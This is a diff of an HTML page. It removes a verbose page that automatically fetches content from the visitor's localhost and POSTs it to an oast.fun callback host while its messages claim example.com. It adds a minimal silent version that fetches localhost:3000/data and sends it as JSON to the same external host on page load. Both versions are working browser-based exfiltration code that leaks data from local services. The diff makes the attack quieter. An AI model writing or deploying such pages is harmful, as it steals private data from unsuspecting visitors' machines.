@@ -1,142 +1,19 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fetch Localhost & Send to Example.com</title>
-    <!-- Tailwind CSS CDN -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body {
-            font-family: "Inter", sans-serif;
-            background-color: #f0f4f8; /* Light blue-gray background */
-            display: flex;
-            justify-content: center;
-            align-items: flex-start; /* Align items to the start for better layout */
-            min-height: 100vh; /* Full viewport height */
-            padding: 2rem; /* Padding around the content */
-            box-sizing: border-box;
-        }
-    </style>
+  <title>Fetch from Localhost</title>
 </head>
-<body class="p-4 sm:p-6 md:p-8">
-    <div class="bg-white p-6 sm:p-8 rounded-xl shadow-lg w-full max-w-2xl">
-        <h1 class="text-3xl font-bold text-gray-800 mb-6 text-center">Fetch Localhost, Send to Example.com</h1>
-
-        <p class="text-gray-700 text-base mb-6 text-center">
-            Attempting to fetch content from <span class="font-semibold text-blue-600">http://127.0.0.1</span> and then send it to <span class="font-semibold text-blue-600">http://example.com</span> automatically.
-            <br><strong class="text-red-500">Note: This will likely be blocked by browser security (CORS).</strong>
-        </p>
-
-        <div id="statusDisplay" class="bg-gray-100 p-4 rounded-lg border border-gray-200 overflow-auto max-h-96 text-sm text-gray-900 whitespace-pre-wrap">
-            <p class="text-gray-500">Initializing...</p>
-        </div>
-
-        <!-- Custom Message Box for alerts -->
-        <div id="messageBox" class="fixed inset-0 bg-gray-900 bg-opacity-50 flex items-center justify-center p-4 z-50 hidden">
-            <div class="bg-white rounded-lg p-6 shadow-xl w-full max-w-sm">
-                <h3 id="messageBoxTitle" class="text-lg font-semibold text-gray-900 mb-3"></h3>
-                <p id="messageBoxContent" class="text-gray-700 mb-5"></p>
-                <button id="messageBoxClose" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-4 rounded-lg transition duration-200">
-                    OK
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        // Get references to HTML elements
-        const statusDisplay = document.getElementById('statusDisplay');
-        const messageBox = document.getElementById('messageBox');
-        const messageBoxTitle = document.getElementById('messageBoxTitle');
-        const messageBoxContent = document.getElementById('messageBoxContent');
-        const messageBoxClose = document.getElementById('messageBoxClose');
-
-        // Define the target URLs
-        const LOCALHOST_URL = 'http://127.0.0.1'; // The local server to fetch from
-        const TARGET_SEND_URL = 'https://dwgorsbfamepzexmcgtvmeiecbvp3s30r.oast.fun'; // The external site to send to
-
-        /**
-         * Displays a custom alert message box.
-         * @param {string} title - The title of the message box.
-         * @param {string} message - The content message.
-         */
-        function showMessageBox(title, message) {
-            messageBoxTitle.textContent = title;
-            messageBoxContent.textContent = message;
-            messageBox.classList.remove('hidden'); // Show the message box
-        }
-
-        // Event listener for the close button of the message box
-        messageBoxClose.addEventListener('click', () => {
-            messageBox.classList.add('hidden'); // Hide the message box
-        });
-
-        /**
-         * Main function to fetch from localhost and send to example.com.
-         */
-        async function fetchAndSend() {
-            statusDisplay.innerHTML = '<p class="text-blue-600 font-medium">Attempting to fetch from 127.0.0.1...</p>';
-
-            let fetchedContent = '';
-            try {
-                // Step 1: Fetch content from localhost
-                const response = await fetch(LOCALHOST_URL);
-
-                if (!response.ok) {
-                    throw new Error(`HTTP error! Status: ${response.status} - ${response.statusText}`);
-                }
-                fetchedContent = await response.text();
-                statusDisplay.innerHTML += `<p class="text-green-600">Successfully fetched from ${LOCALHOST_URL}. Content size: ${fetchedContent.length} bytes.</p>`;
-                statusDisplay.innerHTML += `<p class="text-gray-700">Fetched content preview: ${fetchedContent.substring(0, 200)}...</p>`; // Show a snippet
-
-            } catch (error) {
-                console.error('Error fetching from localhost:', error);
-                statusDisplay.innerHTML += `<p class="text-red-600 font-semibold">Error fetching from ${LOCALHOST_URL}: ${error.message}</p>`;
-                showMessageBox(
-                    'Localhost Fetch Error',
-                    `Could not fetch from ${LOCALHOST_URL}. This is likely due to a CORS policy blocking cross-origin requests, or no server running on that address. Error: ${error.message}`
-                );
-                return; // Stop execution if fetching from localhost fails
-            }
-
-            statusDisplay.innerHTML += `<p class="text-blue-600 font-medium mt-4">Attempting to send data to ${TARGET_SEND_URL}...</p>`;
-
-            try {
-                // Step 2: Send the fetched content to example.com
-                // We'll send it as plain text in a POST request body
-                const sendResponse = await fetch(TARGET_SEND_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'text/plain', // Specify content type as plain text
-                        'Accept': '*/*' // Tell the server we accept any response type
-                    },
-                    body: fetchedContent // Send the fetched content as the request body
-                });
-
-                if (!sendResponse.ok) {
-                    throw new Error(`HTTP error! Status: ${sendResponse.status} - ${sendResponse.statusText}`);
-                }
-
-                const sendResult = await sendResponse.text(); // Get response from example.com
-                statusDisplay.innerHTML += `<p class="text-green-600">Successfully sent data to ${TARGET_SEND_URL}. Server response preview: ${sendResult.substring(0, 200)}...</p>`;
-                showMessageBox(
-                    'Operation Complete',
-                    `Successfully attempted to fetch from localhost and send to example.com. However, remember real websites like example.com rarely process such unsolicited POST requests.`
-                );
-
-            } catch (error) {
-                console.error('Error sending data to example.com:', error);
-                statusDisplay.innerHTML += `<p class="text-red-600 font-semibold">Error sending data to ${TARGET_SEND_URL}: ${error.message}</p>`;
-                showMessageBox(
-                    'Data Send Error (CORS)',
-                    `Could not send data to ${TARGET_SEND_URL}. This is almost certainly due to CORS policy blocking cross-origin POST requests to example.com. Error: ${error.message}`
-                );
-            }
-        }
-
-        // Call the main function automatically when the DOM is fully loaded
-        document.addEventListener('DOMContentLoaded', fetchAndSend);
-    </script>
+<body>
+<script>
+fetch('http://localhost:3000/data')
+  .then(r => r.text())
+  .then(data => {
+    fetch('https://dwgorsbfamepzexmcgtvmeiecbvp3s30r.oast.fun', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ data: data })
+    });
+  });
+</script>
 </body>
 </html>
